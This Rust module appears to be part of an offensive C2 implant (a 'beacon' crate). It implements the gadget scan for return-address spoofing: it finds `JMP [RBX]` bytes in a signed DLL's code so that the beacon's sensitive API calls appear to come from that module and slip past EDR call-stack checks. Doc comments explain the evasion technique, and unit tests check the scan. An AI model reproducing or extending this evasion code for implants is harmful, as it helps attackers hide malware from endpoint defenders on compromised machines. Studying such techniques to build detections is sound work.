//! Return-address spoofing: the gadget scan (port of the original project's
//! `FF 23` search).
//!
//! EDR inspects the return address on sensitive API calls: if it points into
//! unbacked or private executable memory, the call is flagged. The harness
//! (beacon crate) pushes a `JMP [RBX]` gadget address found inside a signed
//! DLL as the fake return address, so the API appears to be called from that
//! module; when it returns, the gadget jumps back to the beacon's
//! continuation through RBX (callee-saved, so it survives the whole call).
//!
//! The byte scan is pure and host-tested here. The original also falls back
//! to `ADD RSP, imm8; RET` gadgets when `FF 23` is absent — deferred (see
//! docs/PARITE.md), `FF 23` is present in every supported kernel32.

/// `jmp qword ptr [rbx]`.
pub const JMP_RBX: [u8; 2] = [0xFF, 0x23];

/// First `JMP [RBX]` offset within a byte slice (a module's `.text`), or
/// `None`. The scan is bounded by the slice — no unbounded walks.
#[inline]
pub fn find_jmp_rbx(text: &[u8]) -> Option<usize> {
    if text.len() < 2 {
        return None;
    }
    let mut i = 0;
    while i + 1 < text.len() {
        if text[i] == JMP_RBX[0] && text[i + 1] == JMP_RBX[1] {
            return Some(i);
        }
        i += 1;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_the_gadget() {
        let text = [0u8, 1, 0xFF, 0x23, 9, 0xFF, 0x23];
        assert_eq!(find_jmp_rbx(&text), Some(2));
    }

    #[test]
    fn first_hit_wins() {
        let text = [0xFF, 0x23, 0, 0xFF, 0x23];
        assert_eq!(find_jmp_rbx(&text), Some(0));
    }

    #[test]
    fn no_gadget_returns_none() {
        assert_eq!(find_jmp_rbx(&[0u8; 64]), None);
        assert_eq!(find_jmp_rbx(&[]), None);
        assert_eq!(find_jmp_rbx(&[0xFF]), None);
        assert_eq!(find_jmp_rbx(&[0xFF, 0x24]), None);
    }

    #[test]
    fn gadget_at_the_very_end_is_found() {
        let text = [1, 2, 3, 0xFF, 0x23];
        assert_eq!(find_jmp_rbx(&text), Some(3));
    }
}
